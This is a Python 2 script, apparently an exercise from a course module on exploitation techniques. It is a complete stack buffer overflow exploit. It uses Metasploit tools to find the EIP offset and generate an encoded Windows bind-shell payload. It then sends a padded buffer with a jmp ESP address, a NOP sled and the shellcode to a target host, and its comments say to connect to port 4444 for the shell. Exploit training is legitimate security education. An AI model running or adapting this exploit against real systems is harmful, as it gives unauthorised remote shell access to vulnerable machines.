#!/usr/bin/python

print "                 __                      "
print "                |__|____ ___  __         "
print "                |  \__  \\\\  \/ /       "
print "                |  |/ __ \\\\   /        "
print "            /\__|  (____  /\_/           "
print "            \______|    \/               "
print "                                         "

print	'Module 5'
print	'Exploitation Techniques'
print

"""
Exploiting a buffer overflow

Write a script to find bad characteis in an exploitation kit
http://tekwizz123.blogspot.in/2012/04/pycommands-tutorial.html
Compare our shellcode and the data stored in the stack after buffer overflow happened, Characters that are missing are wrong.
"""

# Alternative version of the client
# First use random pattenr to find buffer overflow
# Then exploit buffer overflow with a bind shell
# => after exploitation connect to port 4444
import socket
import sys
import os

client_ip = sys.argv[1]
client_port = int(sys.argv[2]) # server listens on 10000

pattern = os.popen('/usr/share/metasploit-framework/tools/pattern_create.rb 500').readline()
payload = os.popen('msfpayload windows/shell_bind_tcp R | msfencode -a x86 -b \'\\x00\' -t c').readline()
# strcpy() based vulnerability, so if there is a null character (0x00), the function will stop reading beyond this caracter and may miss the overflow
# So we cannot just overwrite EIP because the address contains a 0x00, so we overwrite with a jmp esp, which sends the process to the payload
# strcpy() does not use local variables so ESP is left pointing to the first variable. This is not a classical buffer overflow example

# After we sucessfully overflow the buffer, we can verify what part of the pattern overwrote the register for return address (EIP)
# 0x6A413969
# /usr/share/metasploit-framework/tools/pattern_offset.rb 6A413969
# [*] Exact match at offset 268

#print 'shellcode : '
#print pattern

pattern = 'A'*268
pattern += '\x71\xAB\x7B\xfB' # jmp ESP
pattern += '\x90'*20 # NOP
pattern += payload # payload (staged)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((client_ip, client_port)) # takes IP address as a parameter
sock.send(pattern) # send data
print sock.recv(1024) # print response

sock.close()
